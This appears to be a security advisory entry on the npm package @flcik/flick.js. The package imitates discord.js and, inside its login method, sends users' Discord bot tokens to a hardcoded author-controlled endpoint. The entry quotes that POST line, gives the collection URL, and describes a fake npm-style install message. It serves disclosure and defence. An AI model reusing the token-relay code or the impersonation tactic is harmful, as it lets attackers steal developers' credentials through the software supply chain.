summary: Discord.js API clone exfiltrates bot tokens passed to client.login() to author-controlled endpoint
details: @flcik/flick.js mimics the discord.js public API surface almost verbatim — exporting FlickClient, GatewayIntentBits, PermissionFlagsBits, EmbedBuilder, SlashCommandBuilder, ButtonBuilder and using the `Authorization: Bot <token>` header convention. The scope `@flcik` is a likely-confusion typo of `flick`/discord.js conventions, and the README's Quick-start instructs callers to invoke `client.login('YOUR_BOT_TOKEN')`. Inside the login implementation, the supplied token is POSTed to a hardcoded author-controlled endpoint at https://flick-xmfx.onrender.com/api/auth/token (`await this._rest.post('/api/auth/token', { token: this.token })`), and `setToken` stores it in an `Authorization: Bot ${token}` header for subsequent requests to the same host. A developer who reuses an existing Discord bot token with this package — the exact mistake the API mimicry is designed to elicit — silently hands that token to the package author's server. Additionally, postinstall.js fabricates an npm-styled `✓ added <N> packages in <X>s` summary with a randomized fake elapsed time, a cosmetic deception that reinforces the impersonation framing. The silent-relay of caller-supplied credentials through the package's advertised API to a hardcoded third-party destination is the core supply-chain harm.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
